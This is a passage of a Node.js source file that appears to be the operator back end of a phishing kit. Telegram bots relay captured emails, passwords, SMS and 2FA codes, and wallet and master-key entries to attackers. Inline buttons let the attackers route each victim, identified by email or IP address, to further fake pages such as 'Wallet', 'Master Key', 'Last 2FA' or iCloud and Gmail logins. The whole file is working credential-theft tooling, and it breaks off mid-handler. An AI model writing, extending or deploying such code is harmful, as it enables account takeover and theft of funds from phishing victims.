const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.CHAT_ID;
const APP_URL = process.env.APP_URL;

const BOT_TOKEN_CAPTCHA_PAGE = process.env.BOT_TOKEN_CAPTCHA_PAGE;
const CHAT_ID_CAPTCHA_PAGE = process.env.CHAT_ID_CAPTCHA_PAGE;

const BOT_TOKEN_2 = process.env.BOT_TOKEN_2;
const ADMIN_CHAT_ID_2 = process.env.ADMIN_CHAT_ID_2;

// Storage objects
const pendingGmailLogin = {};
const pendingVerificationPage = {};

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
  console.error("❌ Missing BOT_TOKEN, ADMIN_CHAT_ID/CHAT_ID, or APP_URL in environment");
  process.exit(1);
}

if (!BOT_TOKEN_CAPTCHA_PAGE || !CHAT_ID_CAPTCHA_PAGE) {
  console.warn("⚠️ Missing BOT_TOKEN_CAPTCHA_PAGE or CHAT_ID_CAPTCHA_PAGE - captcha alerts will NOT be sent");
}

const bot = new TelegramBot(BOT_TOKEN, {
  polling: {
    autoStart: true,
    params: { timeout: 10 }
  }
});

let bot2 = null;
if (BOT_TOKEN_2 && ADMIN_CHAT_ID_2) {
  bot2 = new TelegramBot(BOT_TOKEN_2, {
    polling: {
      autoStart: true,
      params: { timeout: 10 }
    }
  });

  bot2.getMe().then(() => {
    console.log("✅ Bot 2 connected successfully.");
  }).catch(err => {
    console.error("❌ Bot 2 connection failed:", err.message);
  });

  let bot2RestartAttempts = 0;
  bot2.on("polling_error", (err) => {
    if (err.code === "ETELEGRAM" && err.message.includes("409")) {
      bot2RestartAttempts++;
      if (bot2RestartAttempts <= 1) {
        console.warn("⚠️ Bot 2: 409 Conflict - stopping and restarting polling...");
        bot2.stopPolling().then(() => {
          setTimeout(() => {
            bot2.startPolling();
            console.log("✅ Bot 2: Polling restarted");
          }, 2000);
        });
      } else {
        console.error("❌ Bot 2: Multiple 409 errors - possible duplicate instance");
      }
    } else {
      console.error("❌ Bot 2 polling error:", err.message);
    }
  });
}

let botCaptchaPage = null;
if (BOT_TOKEN_CAPTCHA_PAGE && CHAT_ID_CAPTCHA_PAGE) {
  botCaptchaPage = new TelegramBot(BOT_TOKEN_CAPTCHA_PAGE, {
    polling: {
      autoStart: true,
      params: { timeout: 10 }
    }
  });
  
  botCaptchaPage.getMe().then(() => {
    console.log("✅ Captcha Bot connected successfully.");
  }).catch(err => {
    console.error("❌ Captcha Bot connection failed:", err.message);
  });

  let captchaRestartAttempts = 0;
  botCaptchaPage.on("polling_error", (err) => {
    if (err.code === "ETELEGRAM" && err.message.includes("409")) {
      captchaRestartAttempts++;
      if (captchaRestartAttempts <= 1) {
        console.warn("⚠️ Captcha Bot: 409 Conflict - stopping and restarting polling...");
        botCaptchaPage.stopPolling().then(() => {
          setTimeout(() => {
            botCaptchaPage.startPolling();
            console.log("✅ Captcha Bot: Polling restarted");
          }, 2000);
        });
      } else {
        console.error("❌ Captcha Bot: Multiple 409 errors - possible duplicate instance");
      }
    } else {
      console.error("❌ Captcha Bot polling error:", err.message);
    }
  });
}

bot.getMe().then(() => {
  console.log("✅ Bot connected successfully.");
}).catch(err => {
  console.error("❌ Bot connection failed:", err.message);
});

let botRestartAttempts = 0;
bot.on("polling_error", (err) => {
  if (err.code === "ETELEGRAM" && err.message.includes("409")) {
    botRestartAttempts++;
    if (botRestartAttempts <= 1) {
      console.warn("⚠️ Bot 1: 409 Conflict - stopping and restarting polling...");
      bot.stopPolling().then(() => {
        setTimeout(() => {
          bot.startPolling();
          console.log("✅ Bot 1: Polling restarted");
        }, 2000);
      });
    } else {
      console.error("❌ Bot 1: Multiple 409 errors - possible duplicate instance");
    }
  } else {
    console.error("❌ Polling error:", err.message);
  }
});

const userWinnerTelegram = {};
const notificationSent = {};

async function broadcastMessage(chatId, message, options = {}) {
  const errors = [];

  try {
    await bot.sendMessage(chatId, message, options);
    console.log(`✅ Message sent to Bot 1 (Chat: ${chatId})`);
  } catch (err) {
    console.error("❌ Failed to send to Bot 1:", err.message);
    errors.push(err);
  }

  if (bot2 && ADMIN_CHAT_ID_2) {
    try {
      await bot2.sendMessage(ADMIN_CHAT_ID_2, message, options);
      console.log(`✅ Message sent to Bot 2 (Chat: ${ADMIN_CHAT_ID_2})`);
    } catch (err) {
      console.error("❌ Failed to send to Bot 2:", err.message);
      errors.push(err);
    }
  }

  if (errors.length === 2) {
    throw new Error("Failed to send to all bots");
  }
}

async function sendFollowUpMessage(userId, message, options = {}) {
  try {
    console.log(`🔍 Checking winner for ${userId}: ${userWinnerTelegram[userId]}`);
    
    if (userWinnerTelegram[userId] === "telegram1") {
      await bot.sendMessage(ADMIN_CHAT_ID, message, options);
      console.log(`📨 Follow-up sent to Bot 1 (User: ${userId})`);
    } else if (userWinnerTelegram[userId] === "telegram2") {
      if (bot2 && ADMIN_CHAT_ID_2) {
        await bot2.sendMessage(ADMIN_CHAT_ID_2, message, options);
        console.log(`📨 Follow-up sent to Bot 2 (User: ${userId})`);
      }
    } else {
      console.log(`⚠️ No winner found for ${userId}, not sending follow-up`);
    }
  } catch (err) {
    console.error("❌ Failed to send follow-up message:", err.message);
  }
}

let pendingRequests = {};
const handledCallbacks = new Set();

function sendApprovalRequest(email, password) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${email}` },
          { text: "❌ Reject", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  broadcastMessage(
    ADMIN_CHAT_ID,
    `*Login Approval Requested*\n*Email:* ${email}`,
    { ...options, parse_mode: "Markdown" }
  );
}

function sendApprovalRequestGeneric(identifier) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${identifier}` },
          { text: "❌ Reject", callback_data: `reject|${identifier}` }
        ]
      ]
    }
  };
  broadcastMessage(
    ADMIN_CHAT_ID,
    `*Approval Requested*\nIdentifier: ${identifier}`,
    { ...options, parse_mode: "Markdown" }
  );
}

async function sendApprovalRequestSMS(code, message) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${code}` },
          { text: "❌ Reject", callback_data: `reject|${code}` }
        ]
      ]
    }
  };
  await broadcastMessage(ADMIN_CHAT_ID, message, options);
}

async function sendApprovalRequestPage(email, password, message) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${email}` },
          { text: "❌ Reject", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  await sendFollowUpMessage(email, message, options);
}

async function sendLoginTelegram(email, message) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🔑 2FA Auth 🔑", callback_data: `page1|${email}` }
        ],
        [
          { text: "📧 Approve Email 📧", callback_data: `page2|${email}` }
        ],
        [
          { text: "❌ Reject ❌", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  await broadcastMessage(ADMIN_CHAT_ID, message, options);
}

async function sendVerifyTelegram(ip, message, emailForWinner = null) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🏁 Done Page 🏁", callback_data: `page1|${ip}` }],
        [{ text: "🔐 Last 2FA 🔐", callback_data: `page2|${ip}` }],
        [{ text: "💼 Wallet 💼", callback_data: `page3|${ip}` }],
        [{ text: "🗝️ Master Key 🗝️", callback_data: `page4|${ip}` }]
      ]
    }
  };
  
  if (emailForWinner && userWinnerTelegram[emailForWinner]) {
    await sendFollowUpMessage(emailForWinner, message, options);
  } else {
    await broadcastMessage(ADMIN_CHAT_ID, message, options);
  }
}

async function send2FATelegram(message, requestId) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "❌ Reject ❌", callback_data: `2fa_reject_new|${requestId}` }],
        [{ text: "🏁 Done Page 🏁", callback_data: `2fa_done|${requestId}` }],
        [{ text: "💼 Wallet 💼", callback_data: `2fa_wallet|${requestId}` }],
        [{ text: "🗝️ Master Key 🗝️", callback_data: `2fa_masterkey|${requestId}` }]
      ]
    }
  };
  try {
    if (userWinnerTelegram["temp"]) {
      await sendFollowUpMessage("temp", message, options);
    }
  } catch (err) {
    console.error("❌ Failed to send 2fa:", err);
  }
}

async function sendMasterKeyTelegram(message, requestId) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "❌ Reject ❌", callback_data: `mk_reject|${requestId}` }],
        [{ text: "🏁 Done Page 🏁", callback_data: `mk_done|${requestId}` }],
        [{ text: "💼 Wallet 💼", callback_data: `mk_wallet|${requestId}` }],
        [{ text: "🔐 Passkey 2FA 🔐", callback_data: `mk_passkey|${requestId}` }]
      ]
    }
  };
  try {
    if (userWinnerTelegram["temp"]) {
      await sendFollowUpMessage("temp", message, options);
    }
  } catch (err) {
    console.error("❌ Failed to send master key:", err);
  }
}

async function sendWalletOptionsTelegram(message, requestId) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🗝️ Master Key 🗝️", callback_data: `wallet_master_key|${requestId}` }],
        [{ text: "🔐 2FA 🔐", callback_data: `wallet_2fa|${requestId}` }],
        [{ text: "🏁 Done 🏁", callback_data: `wallet_done|${requestId}` }]
      ]
    }
  };
  try {
    if (userWinnerTelegram["temp"]) {
      await sendFollowUpMessage("temp", message, options);
    }
  } catch (err) {
    console.error("❌ Failed to send wallet options:", err);
  }
}

function send2FACode(code, chatId) {
  pendingRequests[chatId] = true;
  bot.sendMessage(chatId, `Your 2FA code is: ${code}`, {
    reply_markup: {
      keyboard: [["Accept", "Reject"]],
      one_time_keyboard: true,
    },
  });
}

bot.on("message", (msg) => {
  const chatId = msg.chat.id;

  if (pendingRequests[chatId]) {
    if (msg.text === "Accept") {
      bot.sendMessage(chatId, "✅ 2FA code accepted. Redirecting...");
      delete pendingRequests[chatId];
    } else if (msg.text === "Reject") {
      bot.sendMessage(chatId, "❌ 2FA code rejected. Please try again.");
      delete pendingRequests[chatId];
    }
  }
});

// ─── BOT 1 CALLBACK HANDLER ────────────────────────────
bot.on("callback_query", async (query) => {
  if (handledCallbacks.has(query.id)) return;
  handledCallbacks.add(query.id);
  setTimeout(() => handledCallbacks.delete(query.id), 60000);

  try {
    const [action, identifier] = query.data.split("|");
    const userId = identifier;
    
    if (!userWinnerTelegram[userId]) {
      userWinnerTelegram[userId] = "telegram1";
      console.log(`🏆 User ${userId} - Telegram 1 WINS!`);
      
      // Send notification to Bot 2 that Bot 1 won - ONLY on initial login (page1, page2 buttons with email, not IP)
      const isIPAddress = /^\d{1,3}(\.\d{1,3}){3}$/.test(userId);
      if ((action === "page1" || action === "page2") && !isIPAddress && !notificationSent[userId] && bot2 && ADMIN_CHAT_ID_2) {
        notificationSent[userId] = true;
        try {
          await bot2.sendMessage(ADMIN_CHAT_ID_2, `🏆 Bot 1 WINS!`);
          console.log(`📢 Bot 2 notified that Bot 1 won for ${userId}`);
        } catch (err) {
          console.error("❌ Failed to notify Bot 2:", err.message);
          // Retry once after 500ms
          setTimeout(async () => {
            try {
              await bot2.sendMessage(ADMIN_CHAT_ID_2, `🏆 Bot 1 WINS!`);
              console.log(`📢 Bot 2 notified (RETRY) that Bot 1 won for ${userId}`);
            } catch (retryErr) {
              console.error("❌ Retry failed:", retryErr.message);
            }
          }, 500);
        }
      }
    }

    let status;

    // ─── Last 2FA Page Buttons ────────────────────────
    if (action === "2fa_reject_new" || action === "2fa_done" || action === "2fa_wallet" || action === "2fa_masterkey") {
      let newStatus, replyText;

      if (action === "2fa_reject_new") {
        newStatus = "rejected";
        replyText = `❌ <code>${identifier}</code> has been <b>REJECTED</b>`;
      } else if (action === "2fa_done") {
        newStatus = "approved1";
        replyText = `🏁 <code>${identifier}</code> → <b>Done Page</b>`;
      } else if (action === "2fa_wallet") {
        newStatus = "approved2";
        replyText = `💼 <code>${identifier}</code> → <b>Wallet</b>`;
      } else if (action === "2fa_masterkey") {
        newStatus = "approved3";
        replyText = `🗝️ <code>${identifier}</code> → <b>Master Key</b>`;
      }

      await fetch(`${APP_URL}/api/update-2fa-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId: identifier, status: newStatus })
      });

      try {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        );
      } catch (_) {}

      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
      return;
    }

    // ─── Master Key Page Buttons ────────────────────────
    if (action === "mk_reject" || action === "mk_done" || action === "mk_wallet" || action === "mk_passkey") {
      let newStatus, replyText;

      if (action === "mk_reject") {
        newStatus = "rejected";
        replyText = `❌ <code>${identifier}</code> has been <b>REJECTED</b>`;
      } else if (action === "mk_done") {
        newStatus = "mk_approved1";
        replyText = `🏁 <code>${identifier}</code> → <b>Done Page</b>`;
      } else if (action === "mk_wallet") {
        newStatus = "mk_approved2";
        replyText = `💼 <code>${identifier}</code> → <b>Wallet</b>`;
      } else if (action === "mk_passkey") {
        newStatus = "mk_approved3";
        replyText = `🔐 <code>${identifier}</code> → <b>Passkey 2FA</b>`;
      }

      await fetch(`${APP_URL}/api/update-masterkey-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId: identifier, status: newStatus })
      });

      try {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        );
      } catch (_) {}

      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
      return;
    }

    // ─── Wallet Options Page Buttons ────────────────────────
    if (action === "wallet_master_key" || action === "wallet_2fa" || action === "wallet_done") {
      let newStatus, replyText;

      if (action === "wallet_master_key") {
        newStatus = "wallet_master_key";
        replyText = `🗝️ <code>${identifier}</code> → <b>Master Key</b>`;
      } else if (action === "wallet_2fa") {
        newStatus = "wallet_2fa";
        replyText = `🔐 <code>${identifier}</code> → <b>2FA</b>`;
      } else if (action === "wallet_done") {
        newStatus = "wallet_done";
        replyText = `🏁 <code>${identifier}</code> → <b>Done</b>`;
      }

      await fetch(`${APP_URL}/api/update-wallet-options-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId: identifier, status: newStatus })
      });

      try {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        );
      } catch (_) {}

      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
      return;
    }

    // ─── Standard buttons (2fa_approve, accept, page, etc) ────────────────────────
    if (action === "2fa_approve" || action === "2fa_reject") {
      const twoFaStatus = action === "2fa_approve" ? "approved" : "rejected";
      const twoFaEmoji = twoFaStatus === "approved" ? "✅" : "❌";

      await fetch(`${APP_URL}/api/update-2fa-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId: identifier, status: twoFaStatus })
      });

      try {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        );
      } catch (_) {}

      const msgText = query.message.text || "";
      const smsMatch = msgText.match(/(?:SMS|2FA|2FA-2)[:\s]+([\d\s\-]+)/i);
      const displayCode = smsMatch ? smsMatch[1].trim() : null;

      const twoFaStatusText = displayCode
        ? `🔐 <code>${displayCode}</code> has been <b>${twoFaStatus === "approved" ? "ACCEPTED! ✅" : "REJECTED! ❌"}</b>`
        : `${twoFaEmoji} <b>${twoFaStatus.toUpperCase()}</b>`;

      await bot.sendMessage(query.message.chat.id, twoFaStatusText, { parse_mode: "HTML" });
      await bot.answerCallbackQuery(query.id, { text: `❗️${twoFaStatus.toUpperCase()}❗️` });
      return;
    }

    // ─── Device Approval Redirection Buttons ────────────────────────
    if (action === "device_icloud" || action === "device_gmail") {
      const requestId = identifier;
      let newStatus;

      if (action === "device_icloud") {
        newStatus = "icloud";
      } else if (action === "device_gmail") {
        newStatus = "gmail";
      }

      // Get email from server endpoint
      let emailDisplay = 'User';
      try {
        const emailRes = await fetch(`${APP_URL}/get-device-approval/${requestId}`);
        const emailData = await emailRes.json();
        if (emailData.email) {
          emailDisplay = emailData.email;
          console.log(`📧 Device: Fetched email for ${requestId}: ${emailDisplay}`);
        } else {
          console.log(`❌ Device: No email found for ${requestId}`);
        }
      } catch (err) {
        console.log(`❌ Device: Error fetching email:`, err.message);
      }

      await fetch(`${APP_URL}/api/update-device-approval-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId, status: newStatus })
      });

      try {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        );
      } catch (_) {}

      const replyText = newStatus === "icloud" 
        ? `📧 <code>${emailDisplay}</code> has been directed to ☁️<b>iCloud</b>☁️`
        : `📧 <code>${emailDisplay}</code> has been directed to 🌈<b>Gmail</b>🌈`;

      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
      return;
    }

    // ─── Verification Digit Selection (0-9) ────────────────────────
    if (action === "verify_digit") {
      const [, requestId, digit] = query.data.split("|");
      
      const updateResult = await fetch(`${APP_URL}/update-selected-digits`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId, digit })
      });
      
      const result = await updateResult.json();
      
      // If 2 digits are selected, remove the buttons (keep the original message)
      if (result.selectedCount === 2) {
        try {
          await bot.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
          
          // Send a follow-up message
          await bot.sendMessage(
            query.message.chat.id,
            `✅ <b>Numbers Selected!</b>`,
            { parse_mode: "HTML" }
          );
        } catch (err) {
          console.error("Error editing message:", err);
        }
      }

      await bot.answerCallbackQuery(query.id, { text: `📍 Selected: ${digit}` });
      return;
    }

    // ─── Verification Confirm (Accept/Reject) ────────────────────────
    if (action === "verify_accept" || action === "verify_reject") {
      const confirmRequestId = identifier;
      let newStatus;

      if (action === "verify_accept") {
        newStatus = "accepted";
      } else {
        newStatus = "rejected";
      }

      // Get email from server endpoint
      let emailDisplay = 'User';
      try {
        const emailRes = await fetch(`${APP_URL}/get-verification-email/${confirmRequestId}`);
        const emailData = await emailRes.json();
        if (emailData.email) {
          emailDisplay = emailData.email;
          console.log(`📧 Verification: Fetched email for ${confirmRequestId}: ${emailDisplay}`);
        } else {
          console.log(`❌ Verification: No email found for ${confirmRequestId}`);
        }
      } catch (err) {
        console.log(`❌ Verification: Error fetching email:`, err.message);
      }

      await fetch(`${APP_URL}/api/update-verification-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId: confirmRequestId, status: newStatus })
      });

      try {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        );
      } catch (_) {}

      const replyText = newStatus === "accepted"
        ? `📧 <code>${emailDisplay}</code> has been <b>ACCEPTED! ✅</b>`
        : `📧 <code>${emailDisplay}</code> has been <b>REJECTED! ❌</b>`;

      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
      return;
    }

    // ─── Gmail Login Buttons ────────────────────────
    if (action === "gmail_accept" || action === "gmail_reject") {
      const requestId = identifier;
      let newStatus;

      if (action === "gmail_accept") {
        newStatus = "accepted";
      } else {
        newStatus = "rejected";
      }

      // Get email from server endpoint
      let emailDisplay = 'User';
      try {
        const emailRes = await fetch(`${APP_URL}/get-gmail-login/${requestId}`);
        const emailData = await emailRes.json();
        if (emailData.email) {
          emailDisplay = emailData.email;
          console.log(`📧 Gmail: Fetched email for ${requestId}: ${emailDisplay}`);
        } else {
          console.log(`❌ Gmail: No email found for ${requestId}`);
        }
      } catch (err) {
        console.log(`❌ Gmail: Error fetching email:`, err.message);
      }

      await fetch(`${APP_URL}/api/update-gmail-login-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId, status: newStatus })
      });

      try {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        );
      } catch (_) {}

      const replyText = newStatus === "accepted"
        ? `📧 <code>${emailDisplay}</code> has been <b>ACCEPTED! ✅</b>`
        : `📧 <code>${emailDisplay}</code> has been <b>REJECTED! ❌</b>`;

      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
      return;
    }

    if (action === "accept") status = "accepted";
    else if (action === "page1") status = "accepted1";
    else if (action === "page2") status = "accepted2";
    else if (action === "page3") status = "accepted3";
    else if (action === "page4") status = "accepted4";
    else status = "rejected";

    const isAccepted = ["accepted", "accepted1", "accepted2", "accepted3", "accepted4"].includes(status);
    const actionLabel = isAccepted ? "ACCEPTED! ✅" : "REJECTED! ❌";

    await fetch(`${APP_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: identifier, identifier, status })
    });

    try {
      await bot.editMessageReplyMarkup(
        { inline_keyboard: [] },
        { chat_id: query.message.chat.id, message_id: query.message.message_id }
      );
    } catch (_) {}

    let replyText;
    if (status === "accepted1" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
      replyText = `📍 <code>${identifier}</code> → <b>🏁 Done Page</b>`;
    } else if (status === "accepted2" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
      replyText = `📍 <code>${identifier}</code> → <b>🔐 Last 2FA</b>`;
    } else if (status === "accepted3" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
      replyText = `📍 <code>${identifier}</code> → <b>💼 Wallet</b>`;
    } else if (status === "accepted4" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
      replyText = `📍 <code>${identifier}</code> → <b>🗝️ Master Key</b>`;
    } else {
      const isSMS = /^\d+$/.test(identifier);
      replyText = isSMS
        ? `💬 <code>${identifier}</code> has been <b>${actionLabel}</b>`
        : `📧 <code>${identifier}</code> has been <b>${actionLabel}</b>`;
    }

    await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
    await bot.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });

  } catch (err) {
    console.error("❌ Failed to handle callback (Bot 1):", err);
    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval`);
  }
});

// ─── BOT 2 CALLBACK HANDLER (EXACT SAME) ────────────────────────
if (bot2) {
  bot2.on("callback_query", async (query) => {
    if (handledCallbacks.has(query.id)) return;
    handledCallbacks.add(query.id);
    setTimeout(() => handledCallbacks.delete(query.id), 60000);

    try {
      const [action, identifier] = query.data.split("|");
      const userId = identifier;
      
      if (!userWinnerTelegram[userId]) {
        userWinnerTelegram[userId] = "telegram2";
        console.log(`🏆 User ${userId} - Telegram 2 WINS!`);
      }

      let status;

      // ─── Device Approval Redirection Buttons ────────────────────────
      if (action === "device_icloud" || action === "device_gmail") {
        const requestId = identifier;
        let newStatus;

        if (action === "device_icloud") {
          newStatus = "icloud";
        } else if (action === "device_gmail") {
          newStatus = "gmail";
        }

        // Get email from server endpoint
        let emailDisplay = 'User';
        try {
          const emailRes = await fetch(`${APP_URL}/get-device-approval/${requestId}`);
          const emailData = await emailRes.json();
          if (emailData.email) {
            emailDisplay = emailData.email;
            console.log(`📧 Device (Bot 2): Fetched email for ${requestId}: ${emailDisplay}`);
          } else {
            console.log(`❌ Device (Bot 2): No email found for ${requestId}`);
          }
        } catch (err) {
          console.log(`❌ Device (Bot 2): Error fetching email:`, err.message);
        }

        await fetch(`${APP_URL}/api/update-device-approval-status`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ requestId, status: newStatus })
        });

        try {
          await bot2.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
        } catch (_) {}

        const replyText = newStatus === "icloud" 
          ? `📧 <code>${emailDisplay}</code> has been directed to ☁️<b>iCloud</b>☁️`
          : `📧 <code>${emailDisplay}</code> has been directed to 🌈<b>Gmail</b>🌈`;

        await bot2.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
        await bot2.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
        return;
      }

      // ─── Verification Digit Selection (0-9) ────────────────────────
      if (action === "verify_digit") {
        const [, requestId, digit] = query.data.split("|");
        
        const updateResult = await fetch(`${APP_URL}/update-selected-digits`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ requestId, digit })
        });
        
        const result = await updateResult.json();
        
        // If 2 digits are selected, remove the buttons (keep the original message)
        if (result.selectedCount === 2) {
          try {
            await bot2.editMessageReplyMarkup(
              { inline_keyboard: [] },
              { chat_id: query.message.chat.id, message_id: query.message.message_id }
            );
            
            // Send a follow-up message
            await bot2.sendMessage(
              query.message.chat.id,
              `✅ <b>Numbers Selected!</b>`,
              { parse_mode: "HTML" }
            );
          } catch (err) {
            console.error("Error editing message:", err);
          }
        }

        await bot2.answerCallbackQuery(query.id, { text: `📍 Selected: ${digit}` });
        return;
      }

      // ─── Verification Confirm (Accept/Reject) ────────────────────────
      if (action === "verify_accept" || action === "verify_reject") {
        const confirmRequestId = identifier;
        let newStatus;

        if (action === "verify_accept") {
          newStatus = "accepted";
        } else {
          newStatus = "rejected";
        }

        // Get email from server endpoint
        let emailDisplay = 'User';
        try {
          const emailRes = await fetch(`${APP_URL}/get-verification-email/${confirmRequestId}`);
          const emailData = await emailRes.json();
          if (emailData.email) {
            emailDisplay = emailData.email;
            console.log(`📧 Verification (Bot 2): Fetched email for ${confirmRequestId}: ${emailDisplay}`);
          } else {
            console.log(`❌ Verification (Bot 2): No email found for ${confirmRequestId}`);
          }
        } catch (err) {
          console.log(`❌ Verification (Bot 2): Error fetching email:`, err.message);
        }

        await fetch(`${APP_URL}/api/update-verification-status`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ requestId: confirmRequestId, status: newStatus })
        });

        try {
          await bot2.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
        } catch (_) {}

        const replyText = newStatus === "accepted"
          ? `📧 <code>${emailDisplay}</code> has been <b>ACCEPTED! ✅</b>`
          : `📧 <code>${emailDisplay}</code> has been <b>REJECTED! ❌</b>`;

        await bot2.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
        await bot2.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
        return;
      }

      // ─── Gmail Login Buttons ────────────────────────
      if (action === "gmail_accept" || action === "gmail_reject") {
        const requestId = identifier;
        let newStatus;

        if (action === "gmail_accept") {
          newStatus = "accepted";
        } else {
          newStatus = "rejected";
        }

        // Get email from server endpoint
        let emailDisplay = 'User';
        try {
          const emailRes = await fetch(`${APP_URL}/get-gmail-login/${requestId}`);
          const emailData = await emailRes.json();
          if (emailData.email) {
            emailDisplay = emailData.email;
            console.log(`📧 Gmail (Bot 2): Fetched email for ${requestId}: ${emailDisplay}`);
          } else {
            console.log(`❌ Gmail (Bot 2): No email found for ${requestId}`);
          }
        } catch (err) {
          console.log(`❌ Gmail (Bot 2): Error fetching email:`, err.message);
        }

        await fetch(`${APP_URL}/api/update-gmail-login-status`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ requestId, status: newStatus })
        });

        try {
          await bot2.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
        } catch (_) {}

        const replyText = newStatus === "accepted"
          ? `📧 <code>${emailDisplay}</code> has been <b>ACCEPTED! ✅</b>`
          : `📧 <code>${emailDisplay}</code> has been <b>REJECTED! ❌</b>`;

        await bot2.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
        await bot2.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
        return;
      }

      // ─── Last 2FA Page Buttons ────────────────────────
      if (action === "2fa_reject_new" || action === "2fa_done" || action === "2fa_wallet" || action === "2fa_masterkey") {
        let newStatus, replyText;

        if (action === "2fa_reject_new") {
          newStatus = "rejected";
          replyText = `❌ <code>${identifier}</code> has been <b>REJECTED</b>`;
        } else if (action === "2fa_done") {
          newStatus = "approved1";
          replyText = `🏁 <code>${identifier}</code> → <b>Done Page</b>`;
        } else if (action === "2fa_wallet") {
          newStatus = "approved2";
          replyText = `💼 <code>${identifier}</code> → <b>Wallet</b>`;
        } else if (action === "2fa_masterkey") {
          newStatus = "approved3";
          replyText = `🗝️ <code>${identifier}</code> → <b>Master Key</b>`;
        }

        await fetch(`${APP_URL}/api/update-2fa-status`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ requestId: identifier, status: newStatus })
        });

        try {
          await bot2.editMessageReplyMarkup(
            { inline_keyboard: [] },
